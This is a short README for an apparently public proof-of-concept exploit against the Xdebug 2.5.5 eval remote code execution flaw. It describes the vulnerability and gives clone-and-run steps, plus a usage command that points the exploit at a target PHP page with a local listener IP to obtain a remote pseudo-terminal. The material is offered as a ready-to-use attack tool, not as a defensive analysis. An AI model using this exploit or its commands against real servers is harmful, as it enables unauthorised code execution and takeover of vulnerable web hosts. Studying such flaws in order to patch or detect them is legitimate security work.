# xdebug 2.5.5 RCE

An automated POC exploit of the xdebug 2.5.5 RCE vulnerability

## Vulnerability

This vulnerability can be abused due to the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user.

## Installation

> Download from source
```sh
git clone https://github.com/D3Ext/xdebug-exploit
cd xdebug-exploit
pip3 install -r requirements.txt
python3 exploit.py
```

## Usage

Just execute the exploit and especify a valid URL with a PHP file like `index.php` and the local host. Then the exploit will try to establish a pseudo-terminal which allows you to execute commands

```sh
python3 exploit.py -u http://10.10.10.83/index.php -l 10.10.16.3
```

\* *In some cases the output won't be reflected at all and you will only see the first line of the executed command, this is not a problem of the script, the vuln works like this)*
